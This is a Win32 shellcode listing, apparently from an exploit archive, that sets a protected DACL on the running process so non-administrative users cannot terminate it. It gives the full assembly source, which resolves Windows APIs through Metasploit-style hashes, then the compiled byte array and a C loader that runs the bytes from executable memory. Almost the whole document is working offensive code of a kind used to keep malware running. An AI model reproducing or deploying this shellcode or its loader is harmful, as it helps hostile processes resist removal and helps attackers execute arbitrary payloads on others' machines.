/*

# Win32 - Protect Process Shellcode
# Date: [17.02.2017]
# Author: [Ege Balcı]
# Tested on: [Win 7/8/8.1/10]

This shellcode sets the SE_DACL_PROTECTED flag inside security descriptor structure,
this will prevent the process being terminated by non administrative users.

-----------------------------------------------------------------

[BITS 32]
[ORG 0]

;   EAX-> Return Values
;   EBX-> Process Handle
;   EBP-> API Block
;   ESI-> Saved ESP

    pushad              ; Save all registers to stack
    pushfd              ; Save all flags to stack

    push esp            ; Push the current esp value
    pop esi             ; Save the current esp value to ecx

    cld                 ; Clear direction flags
    call Start

%include "API-BLOCK.asm"; Stephen Fewer's hash API from metasploit project

Start:
    pop ebp             ; Pop the address of SFHA

    push 0x62C64749     ; hash(kernel32.dll, GetCurrentProcessId())
    call ebp            ; GetCurrentProcessId()

    push eax            ; Process ID
    push 0x00000000     ; FALSE
    push 0x1F0FFF       ; PROCESS_ALL_ACCESS
    push 0x50B695EE     ; hash(kernel32.dll, OpenProcess)
    call ebp            ; OpenProcess(PROCESS_ALL_ACCESS,FALSE,ECX)
    mov ebx, eax        ; Move process handle to ebx


    push 0x00000000     ; 0,0
    push 0x32336970     ; pi32
    push 0x61766461     ; adva
    push esp            ; Push the address of "advapi32" string
    push 0x0726774C     ; hash(kernel32.dll, LoadLibraryA)
    call ebp            ; LoadLibraryA("advapi32")

    push 0x00503a44     ; "D:P"
    sub esp,4           ; Push the address of "D:P" string to stack

    push 0x00000000     ; FALSE
    lea eax, [esp+4]    ; Load the address of 4 byte buffer to EAX
    push eax            ; Push the 4 byte buffer address
    push 0x00000001     ; SDDL_REVISION_1
    lea eax, [esp+16]   ; Load the address of "D:P" string to EAX
    push eax            ; Push the EAX value
    push 0xDA6F639A     ; hash(advapi32.dll, ConvertStringSecurityDescriptorToSecurityDescriptor)
    call ebp            ; ConvertStringSecurityDescriptorToSecurityDescriptor("D:P",SDDL_REVISION_1,FALSE)

    push 0x00000004     ; DACL_SECURITY_INFORMATION
    push ebx            ; Process Handle
    push 0xD63AF8DB     ; hash(kernel32.dll, SetKernelObjectSecurity)
    call ebp            ; SetKernelObjectSecurity(ProcessHandle,DACL_SECURITY_INFORMATION,SecurityDescriptor)

    mov esp,esi         ; Restore the address of esp
    popad               ; Popback all registers
    popfd               ; Popback all flags
    ret                 ; Return


*/


//>Special thanks to Yusuf Arslan Polat ;D
#include <windows.h>
#include <stdio.h>

unsigned char Shellcode[] = {
  0x60, 0x9c, 0x54, 0x5e, 0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89,
  0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30, 0x8b, 0x52, 0x0c, 0x8b, 0x52,
  0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff, 0xac, 0x3c,
  0x61, 0x7c, 0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf2,
  0x52, 0x57, 0x8b, 0x52, 0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78,
  0xe3, 0x48, 0x01, 0xd1, 0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49,
  0x18, 0xe3, 0x3a, 0x49, 0x8b, 0x34, 0x8b, 0x01, 0xd6, 0x31, 0xff, 0xac,
  0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0x38, 0xe0, 0x75, 0xf6, 0x03, 0x7d, 0xf8,
  0x3b, 0x7d, 0x24, 0x75, 0xe4, 0x58, 0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66,
  0x8b, 0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04, 0x8b, 0x01,
  0xd0, 0x89, 0x44, 0x24, 0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff,
  0xe0, 0x5f, 0x5f, 0x5a, 0x8b, 0x12, 0xeb, 0x8d, 0x5d, 0x68, 0x49, 0x47,
  0xc6, 0x62, 0xff, 0xd5, 0x50, 0x6a, 0x00, 0x68, 0xff, 0x0f, 0x1f, 0x00,
  0x68, 0xee, 0x95, 0xb6, 0x50, 0xff, 0xd5, 0x89, 0xc3, 0x6a, 0x00, 0x68,
  0x70, 0x69, 0x33, 0x32, 0x68, 0x61, 0x64, 0x76, 0x61, 0x54, 0x68, 0x4c,
  0x77, 0x26, 0x07, 0xff, 0xd5, 0x68, 0x44, 0x3a, 0x50, 0x00, 0x83, 0xec,
  0x04, 0x6a, 0x00, 0x8d, 0x44, 0x24, 0x04, 0x50, 0x6a, 0x01, 0x8d, 0x44,
  0x24, 0x10, 0x50, 0x68, 0x9a, 0x63, 0x6f, 0xda, 0xff, 0xd5, 0x6a, 0x04,
  0x53, 0x68, 0xdb, 0xf8, 0x3a, 0xd6, 0xff, 0xd5, 0x89, 0xf4, 0x61, 0x9d,
  0xc3
};



int main(int argc, char const *argv[])
{
	char* BUFFER = (char*)VirtualAlloc(NULL, sizeof(Shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(BUFFER, Shellcode, sizeof(Shellcode));
	(*(void(*)())BUFFER)();

	printf("This process is protected !");
	getchar();

	return 0;
}